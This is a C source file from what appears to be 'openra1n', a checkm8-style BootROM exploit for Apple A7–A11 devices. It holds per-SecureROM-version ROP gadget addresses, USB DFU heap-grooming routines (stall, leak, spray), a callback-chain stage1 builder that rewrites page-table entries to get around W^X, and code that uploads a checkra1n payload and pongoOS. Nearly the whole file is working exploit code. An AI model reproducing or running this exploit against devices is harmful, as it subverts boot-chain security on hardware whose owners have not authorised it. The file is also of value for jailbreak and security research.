#include <openra1n_private.h>
#include <openra1n.h>

#include <common.h>

#include <common/log.h>

#include <lz4/lz4.h>
#include <lz4/lz4hc.h>

#ifdef __MINGW32__
#include <windows.h>
#include <winsock2.h>
#else
#include <arpa/inet.h>
#endif
#include <payloads.h>

#define ARM_16K_TT_L2_SHIFT      25                    /* page descriptor shift */

static uint16_t cpid;
static const char *pwnd_str = " YOLO:checkra1n";

static size_t config_hole, config_overwrite_pad;
static uint64_t insecure_memory_base;
static uint64_t func_gadget, write_prim, write_prim2, arm_clean_invalidate_dcache_line, arm_invalidate_icache, enter_critical_section, exit_critical_section, write_ttbr0, tlbi, TTBR0_PATCH_BASE, TTBR0_BASE, bootstrap_task_lr, payload_start_offset;

int openra1n_check_usb_device(usb_handle_t *handle,
                         void *pwned)
{
    char *usb_serial_num = get_usb_serial_number(handle);
    int ret = 0;
    
    if(usb_serial_num != NULL)
    {
        if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL)
        {
            cpid = 0x7001;
            config_overwrite_pad = 0x500;
            
            insecure_memory_base                = 0x180380000;
            func_gadget                         = 0x100010df4;
            write_prim                          = 0x10000ed5c;
            arm_clean_invalidate_dcache_line    = 0x100000448;
            arm_invalidate_icache               = 0x100000424;
            bootstrap_task_lr                   = 0x1800c2f68;
            payload_start_offset                = 0xc0;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL)
        {
            cpid = 0x7000;
            config_overwrite_pad = 0x500;
            
            insecure_memory_base                = 0x180380000;
            func_gadget                         = 0x10000ddf4;
            write_prim                          = 0x10000bc2c;
            arm_clean_invalidate_dcache_line    = 0x100000448;
            arm_invalidate_icache               = 0x100000424;
            bootstrap_task_lr                   = 0x1800c2f68;
            payload_start_offset                = 0xc0;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL)
        {
            cpid = 0x8003;
            config_overwrite_pad = 0x500;
            
            insecure_memory_base                = 0x180380000;
            func_gadget                         = 0x10000de0c;
            write_prim2                         = 0x100001bc0;
            arm_clean_invalidate_dcache_line    = 0x10000042c;
            arm_invalidate_icache               = 0x100000408;
            bootstrap_task_lr                   = 0x1800c2f58;
            payload_start_offset                = 0xc0;
            
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL)
        {
            cpid = 0x8000;
            config_overwrite_pad = 0x500;
            
            insecure_memory_base                = 0x180380000;
            func_gadget                         = 0x10000de0c;
            write_prim2                         = 0x100001bc0;
            arm_clean_invalidate_dcache_line    = 0x10000042c;
            arm_invalidate_icache               = 0x100000408;
            bootstrap_task_lr                   = 0x1800c2f58;
            payload_start_offset                = 0xc0;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-2481.0.0.2.1]") != NULL)
        {
            cpid = 0x8001;
            config_hole = 6;
            config_overwrite_pad = 0x5C0;
            
            insecure_memory_base                = 0x180000000;
            func_gadget                         = 0x10000cd38;
            write_prim2                         = 0x100001a78;
            arm_clean_invalidate_dcache_line    = 0x10000043c;
            arm_invalidate_icache               = 0x100000418;
            enter_critical_section              = 0x100009b24;
            exit_critical_section               = 0x100009b88;
            write_ttbr0                         = 0x1000003b4;
            tlbi                                = 0x100000404;
            TTBR0_PATCH_BASE                    = 0x180004000;
            TTBR0_BASE                          = 0x50000;
            bootstrap_task_lr                   = 0x180059f58;
            payload_start_offset                = 0x600;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-2696.0.0.1.33]") != NULL)
        {
            cpid = 0x8010;
            config_hole = 5;
            config_overwrite_pad = 0x5C0;
            
            insecure_memory_base                = 0x1800B0000;
            func_gadget                         = 0x10000cc44;
            write_prim2                         = 0x100001808;
            arm_clean_invalidate_dcache_line    = 0x10000046c;
            arm_invalidate_icache               = 0x100000448;
            enter_critical_section              = 0x10000A4B8;
            exit_critical_section               = 0x10000A514;
            write_ttbr0                         = 0x1000003E4;
            tlbi                                = 0x100000434;
            TTBR0_PATCH_BASE                    = 0x1800b4000;
            TTBR0_BASE                          = 0xa0000;
            bootstrap_task_lr                   = 0x1800a9f68;
            payload_start_offset                = 0x600;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-3135.0.0.2.3]") != NULL)
        {
            cpid = 0x8011;
            config_hole = 6;
            config_overwrite_pad = 0x540;
            
            insecure_memory_base                = 0x1800B0000;
            func_gadget                         = 0x10000cce4;
            write_prim2                         = 0x100001804;
            arm_clean_invalidate_dcache_line    = 0x10000047c;
            arm_invalidate_icache               = 0x100000458;
            enter_critical_section              = 0x10000a658;
            exit_critical_section               = 0x10000a6a0;
            write_ttbr0                         = 0x1000003F4;
            tlbi                                = 0x100000444;
            TTBR0_PATCH_BASE                    = 0x1800b4000;
            TTBR0_BASE                          = 0xa0000;
            bootstrap_task_lr                   = 0x1800a9f88;
            payload_start_offset                = 0x600;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-3332.0.0.1.23]") != NULL)
        {
            cpid = 0x8015;
            config_hole = 6;
            config_overwrite_pad = 0x540;
            
            insecure_memory_base                = 0x18001C000;
            func_gadget                         = 0x10000a998;
            write_prim                          = 0x100009c48;
            arm_clean_invalidate_dcache_line    = 0x1000004e4;
            arm_invalidate_icache               = 0x1000004c0;
            enter_critical_section              = 0x10000f958;
            exit_critical_section               = 0x10000f9a0;
            write_ttbr0                         = 0x10000045c;
            tlbi                                = 0x1000004ac;
            TTBR0_PATCH_BASE                    = 0x180020000;
            TTBR0_BASE                          = 0xc000;
            bootstrap_task_lr                   = 0x180015f88;
            payload_start_offset                = 0x600;
        }
        else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL)
        {
            cpid = 0x8012;
            config_hole = 6;
            config_overwrite_pad = 0x540;
            
            insecure_memory_base                = 0x18001C000;
            func_gadget                         = 0x100008d8c;
            write_prim                          = 0x100008058;
            arm_clean_invalidate_dcache_line    = 0x1000004cc;
            arm_invalidate_icache               = 0x1000004a8;
            enter_critical_section              = 0x10000f9b8;
            exit_critical_section               = 0x10000fa00;
            write_ttbr0                         = 0x100000444;
            tlbi                                = 0x100000494;
            TTBR0_PATCH_BASE                    = 0x180020000;
            TTBR0_BASE                          = 0xc000;
            bootstrap_task_lr                   = 0x180015f78;
            payload_start_offset                = 0x600;
        }
        if(cpid != 0)
        {
            *(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
            ret = cpid;
        }
        free(usb_serial_num);
    }
    return ret;
}

static bool dfu_check_status(const usb_handle_t *handle,
                 uint8_t status,
                 uint8_t state)
{
    struct
    {
        uint8_t status;
        uint8_t poll_timeout[3];
        uint8_t state;
        uint8_t str_idx;
    } dfu_status;
    
    transfer_ret_t transfer_ret;
    
    // usb_ctrl_req(0xa1, 3, 0, 0)
    if(send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret))
    {
        // sanity checks
        if(transfer_ret.ret == USB_TRANSFER_OK
           && transfer_ret.sz == sizeof(dfu_status)
           && dfu_status.status == status
           && dfu_status.state == state)
        {
            return true;
        }
    }
    return false;
}

static bool dfu_set_state_wait_reset(const usb_handle_t *handle)
{
    transfer_ret_t transfer_ret;
    
    // usb_ctrl_req(0x21, 1, 0, 0)
    if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret))
    {
        // sanity checks
        if(transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0)
        {
            if(dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC)
               && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST)
               && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET))
            {
                return true;
            }
        }
    }
    return false;
}

OPENRA1N_EXPORT bool openra1n_stage_reset(const usb_handle_t *handle)
{
    transfer_ret_t transfer_ret;
    
    // usb_ctrl_req(0x21, 1, 0, 0)
    if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret))
    {
        if(transfer_ret.ret == USB_TRANSFER_OK
           && transfer_ret.sz == DFU_FILE_SUFFIX_LEN)
        {
            if(dfu_set_state_wait_reset(handle))
            {
                if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, &transfer_ret))
                {
                    if(transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == EP0_MAX_PACKET_SZ)
                    {
                        return true;
                    }
                }
            }
        }
    }
    
    send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
    return false;
}

OPENRA1N_EXPORT bool openra1n_stage_setup(const usb_handle_t *handle)
{
    unsigned usb_abort_timeout = usb_timeout - 1;
    transfer_ret_t transfer_ret;
    
    for(;;)
    {
        if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret))
        {
            if(transfer_ret.sz < config_overwrite_pad)
            {
                if(send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret))
                {
                    if(transfer_ret.ret == USB_TRANSFER_STALL)
                    {
                        return true;
                    }
                }
            }
        }
        
        // re-do
        send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
        usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
    }
    return false;
}

static bool openra1n_private_request_leak(const usb_handle_t *handle)
{
    transfer_ret_t transfer_ret;
    
    if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret))
    {
        if(transfer_ret.sz == 0)
        {
            return true;
        }
    }
    return false;
}

static void openra1n_stall(const usb_handle_t *handle)
{
    unsigned usb_abort_timeout = usb_timeout - 1;
    transfer_ret_t transfer_ret;
    
    for(;;)
    {
        if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret))
        {
            if(transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ)
            {
                if(openra1n_private_request_leak(handle))
                {
                    break;
                }
            }
        }
        usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
    }
}

static bool openra1n_no_leak(const usb_handle_t *handle)
{
    transfer_ret_t transfer_ret;
    
    if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret))
    {
        if(transfer_ret.sz == 0)
        {
            return true;
        }
    }
    return false;
}

static bool openra1n_private_request_stall(const usb_handle_t *handle)
{
    transfer_ret_t transfer_ret;
    
    if(send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret))
    {
        if(transfer_ret.ret == USB_TRANSFER_STALL)
        {
            return true;
        }
    }
    return false;
}

OPENRA1N_EXPORT bool openra1n_stage_spray(const usb_handle_t *handle)
{
    size_t i;
    
    if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000)
    {
        while(!openra1n_private_request_stall(handle) || !openra1n_private_request_leak(handle) || !openra1n_no_leak(handle)) {}
    }
    else
    {
        openra1n_stall(handle);
        for(i = 0; i < config_hole; ++i)
        {
            while(!openra1n_no_leak(handle)) {}
        }
        while(!openra1n_private_request_leak(handle) || !openra1n_no_leak(handle)) {}
    }
    
    send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
    return true;
}

static bool generate_stage1(void** outbuf,
                            size_t* outlen,
                            void* payload,
                            size_t payload_sz,
                            uint16_t cpid)
{
    bool wnx = false;
    uint64_t write_gadget = 0;
    uint32_t write_val = 0;
    
    uint64_t base_address = insecure_memory_base;
    
    if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015)
    {
        wnx = true;
    }
    
    size_t presize = wnx == true ? 0x600 : 0xc0;
    void *buf = malloc(presize);
    
    uint32_t nextOffset = 0;
    unsigned char* nextBuf = NULL;
    dfu_callback_t* cb = (dfu_callback_t*)buf;
    nextBuf = buf;
    
    uint32_t current_size = 0;
    int count = 0;
#define PUSH(end, func, arg0, arg1) \
{ \
count++; \
current_size = nextOffset + sizeof(dfu_callback_t); \
if(!(current_size > (wnx == true ? 0x600 : 0xc0))) \
{ \
cb->callback = func_gadget; \
if(count%3 == 0) \
nextOffset += 0x80; \
else \
nextOffset += 0x20; \
if(!end)cb->next = base_address + nextOffset; \
uint64_t* ptr = (uint64_t*)(cb); \
uint32_t* ptr32 = (uint32_t*)(cb); \
ptr[15] = func; \
if(func == write_prim) \
{ \
ptr[14] = (uint64_t)(arg0 - 4); \
ptr32[5] = (uint32_t)arg1; \
} \
else if(func == write_prim2) \
{ \
ptr[14] = (uint64_t)arg0; \
ptr32[5] = (uint32_t)arg1; \
} \
else if(func == write_ttbr0) \
{ \
ptr[14] = (uint64_t)arg0; \
} \
else if(func == arm_clean_invalidate_dcache_line) \
{ \
ptr[14] = (uint64_t)arg0; \
} \
nextBuf = (unsigned char*)(buf + nextOffset); \
cb = (dfu_callback_t*)nextBuf; \
} \
else \
{ \
goto fail; \
} \
} \

    if((cpid == 0x8015) || (cpid == 0x8012) || (cpid == 0x7001) || (cpid == 0x7000))
    {
        write_gadget = write_prim;
    }
    else
    {
        write_gadget = write_prim2;
    }
    
    uint64_t vrom_address = 0x100000000;
    uint64_t sram_address = 0x180000000;
    uint64_t new_va       = 0x142000000; // post-exploit
    uint32_t vrom_off     = (vrom_address >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t new_off      = (new_va       >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t sram_off     = (sram_address >> ARM_16K_TT_L2_SHIFT) * 8;
    
    uint64_t sram_rx_va  = 0x140000000; // execute payload
    uint64_t sram_rw_va  = 0x142000000; // custom ttbr
    uint32_t sram_rx_off = (sram_rx_va >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t sram_rw_off = (sram_rw_va >> ARM_16K_TT_L2_SHIFT) * 8;
    
    if(wnx) // only A9X-A11
    {
        // VROM: 0x100000000
        uint64_t vrom_bit = vrom_address | 0x6a5;
        uint32_t vrom_bit_lower = (uint32_t)(vrom_bit & 0xffffffff);
        uint32_t vrom_bit_upper = (uint32_t)(vrom_bit >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (vrom_off + 0), vrom_bit_lower);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (vrom_off + 4), vrom_bit_upper);
        
        // Newp: 0x142000000
        uint64_t new_bit = sram_address | 0x621; // pa
        new_bit |= (cpid != 0x8001 ? (1uL << 2) : (2uL << 2));
        new_bit |= (1uL << 53); // PXN
        new_bit |= (1uL << 54); // XN
        uint32_t new_bit_lower  = (uint32_t)(new_bit & 0xffffffff);
        uint32_t new_bit_upper  = (uint32_t)(new_bit >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (new_off + 0), new_bit_lower);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (new_off + 4), new_bit_upper);
        
        // SRAM: 0x180000000
        uint64_t sram_bit = sram_address | 0x3;
        sram_bit |= (1uL << 63); // NS
        if(cpid == 0x8015) sram_bit |= 0x10000;
        if(cpid == 0x8012) sram_bit |= 0x10000;
        if(cpid == 0x8011) sram_bit |= 0xa4000;
        if(cpid == 0x8010) sram_bit |= 0xa4000;
        if(cpid == 0x8001) sram_bit |= 0x54000;
        uint32_t sram_bit_lower = (uint32_t)(sram_bit & 0xffffffff);
        uint32_t sram_bit_upper = (uint32_t)(sram_bit >> 32);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (sram_off + 0), sram_bit_lower);
        PUSH(0, write_gadget, TTBR0_PATCH_BASE + (sram_off + 4), sram_bit_upper);
    }
    
    if(wnx)
    {
        write_val = (uint32_t)(((base_address & 0x01FFFFFF) | (sram_rx_va & 0xffffffff)) + payload_start_offset);
    }
    else
    {
        write_val = (uint32_t)((base_address & 0xFFFFFFFF) + payload_start_offset);
    }
    PUSH(0, write_gadget, bootstrap_task_lr, write_val);
    
    if(wnx) // only A9X-A11
    {
        PUSH(0, arm_clean_invalidate_dcache_line, TTBR0_PATCH_BASE + (vrom_off & ~0xff), 0);
        PUSH(0, arm_clean_invalidate_dcache_line, TTBR0_PATCH_BASE + (new_off  & ~0xff), 0);
        PUSH(0, arm_clean_invalidate_dcache_line, TTBR0_PATCH_BASE + (sram_off & ~0xff), 0);
    }
    PUSH(0, arm_clean_invalidate_dcache_line, base_address + payload_start_offset, 0);
    PUSH(wnx == true ? 0 : 1, arm_invalidate_icache, 0, 0);
    
    if(wnx) // only A9X-A11
    {
        uint64_t sram_rx_bit = sram_address | 0x6a5;
        uint32_t sram_rx_bit_lower = (uint32_t)(sram_rx_bit & 0xffffffff);
        uint32_t sram_rx_bit_upper = (uint32_t)(sram_rx_bit >> 32);
        
        uint64_t sram_rw_bit = sram_address | 0x621;
        sram_rw_bit |= (cpid != 0x8001 ? (1uL << 2) : (2uL << 2));
        sram_rw_bit |= (1uL << 53); // PXN
        sram_rw_bit |= (1uL << 54); // XN
        uint32_t sram_rw_bit_lower = (uint32_t)(sram_rw_bit & 0xffffffff);
        uint32_t sram_rw_bit_upper = (uint32_t)(sram_rw_bit >> 32);
        
        PUSH(0, enter_critical_section, 0, 0);
        PUSH(0, write_ttbr0, TTBR0_PATCH_BASE, 0);
        PUSH(0, tlbi, 0, 0);
        
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rx_off + 0), sram_rx_bit_lower);
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rx_off + 4), sram_rx_bit_upper);
        
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rw_off + 0), sram_rw_bit_lower);
        PUSH(0, write_gadget, sram_rw_va + TTBR0_BASE + (sram_rw_off + 4), sram_rw_bit_upper);
        PUSH(0, arm_clean_invalidate_dcache_line, sram_rw_va + TTBR0_BASE + (sram_rx_off & ~0xff), 0);
        PUSH(0, write_ttbr0, sram_address + TTBR0_BASE, 0);
        PUSH(0, tlbi, 0, 0);
        PUSH(1, exit_critical_section, 0, 0);
    }
    
    *outlen = payload_sz + (wnx == true ? 0x600 : 0xc0);
    *outbuf = malloc(*outlen);
    
    memset(*outbuf, 0x0, *outlen);
    memcpy(*outbuf, buf, wnx == true ? 0x600 : 0xc0);
    memcpy(*outbuf + (wnx == true ? 0x600 : 0xc0), payload, payload_sz);
    if(buf) free(buf);
    return true;
    
fail:
    if(buf) free(buf);
    return false;
}

OPENRA1N_EXPORT bool openra1n_stage_patch(const usb_handle_t *handle, void* checkra1n_payload, size_t checkra1n_payload_sz)
{
    size_t i, data_sz, packet_sz;
    uint8_t *data;
    transfer_ret_t transfer_ret;
    bool ret = false;

    void *overwrite = NULL;
    size_t overwrite_sz = 0;
    
    openra1n_overwrite_t openra1n_overwrite;
    memset(&openra1n_overwrite, '\0', sizeof(openra1n_overwrite));
    openra1n_overwrite.callback.next = insecure_memory_base;
    overwrite = &openra1n_overwrite;
    overwrite_sz = sizeof(openra1n_overwrite);
    
    if(generate_stage1((void *)&data, &data_sz, checkra1n_payload, checkra1n_payload_sz, cpid))
    {
        if(openra1n_private_request_stall(handle) && openra1n_private_request_leak(handle))
        {
            LOG_DEBUG("successfully leaked data");
        }
        else
        {
            LOG_ERROR("failed to leak data");
            return false;
        }
        
        for(i = 0; i < 2; i++)
        {
            LOG_DEBUG("i = %zu", i);
            send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, NULL);
        }
        
        if(overwrite != NULL)
        {
            if(send_usb_control_request(handle, 0, 0, 0, 0x00, overwrite, overwrite_sz, &transfer_ret))
            {
                if(transfer_ret.ret == USB_TRANSFER_STALL)
                {
                    ret = true;
                    for(i = 0; ret && i < data_sz; i += packet_sz)
                    {
                        packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
                        ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
                    }
                    send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
                }
            }
        }
        if(data) free(data);
        return ret;
    }
    if(data) free(data);
    return false;
}

static void compress_pongo(void *out,
                           size_t *out_len, void* in, size_t in_len)
{
    *out_len = LZ4_compress_HC(in, out, in_len, *out_len, LZ4HC_CLEVEL_MAX);
}

OPENRA1N_EXPORT bool openra1n_boot_pongo(usb_handle_t *handle, void* pongo_bin, unsigned int pongo_bin_len)
{
    transfer_ret_t transfer_ret;
    LOG_INFO("Booting pongoOS");
    LOG_DEBUG("Compressing pongoOS");
    LOG_DEBUG("Appending shellcode to the top of pongoOS (512 bytes)");
    void *shellcode = malloc(512);
    memcpy(shellcode, lz4dec_bin, lz4dec_bin_len);
    size_t out_len = pongo_bin_len;
    void *out = malloc(out_len);
    compress_pongo(out, &out_len, pongo_bin, (size_t)pongo_bin_len);
    LOG_DEBUG("Compressed pongoOS from %u to %zu bytes", pongo_bin_len, out_len);
    void *tmp = malloc(out_len + 512);
    memcpy(tmp, shellcode, 512);
    memcpy(tmp + 512, out, out_len);
    free(out);
    out = tmp;
    out_len += 512;
    free(shellcode);
    LOG_DEBUG("Setting the compressed size into the shellcode");
    uint32_t* size = (uint32_t*)(out + 0x1fc);
    uint32_t compressed_size = out_len - 512;
    if (htonl(compressed_size) == compressed_size) {
        *size = ((compressed_size>>24)&0xff) |
                    ((compressed_size<<8)&0xff0000) |
                    ((compressed_size>>8)&0xff00) |
                    ((compressed_size<<24)&0xff000000);
    } else {
        *size = compressed_size;
    }
    LOG_DEBUG("Reconnecting to device");
    usb_handle_t* yolo_handle = openra1n_init_usb_handle(APPLE_VID, DFU_MODE_PID);
    if (yolo_handle == NULL) return false;
    LOG_DEBUG("Waiting for device to be ready");
    openra1n_wait_usb_handle(yolo_handle, NULL);
    {
        size_t len = 0;
        size_t size;
        while(len < out_len)
        {
        retry:
            size = ((out_len - len) > 0x800) ? 0x800 : (out_len - len);
            send_usb_control_request(yolo_handle, 0x21, DFU_DNLOAD, 0, 0, (unsigned char*)&out[len], size, &transfer_ret);
            if(transfer_ret.ret == USB_TRANSFER_TIMEOUT)
            {
                LOG_DEBUG("retrying at len = %zu", len);
                openra1n_sleep_ms(100);
                goto retry;
            }
            else if(transfer_ret.sz != size || transfer_ret.ret != USB_TRANSFER_OK)
            {
                // fail
                return false;
            }
            len += size;
            LOG_DEBUG("len = %zu", len);
        }
    }
    send_usb_control_request_no_data(yolo_handle, 0x21, 4, 0, 0, 0, NULL);
    LOG_DEBUG("pongoOS sent, should be booting");
    openra1n_free_handle(yolo_handle);
    return true;
}
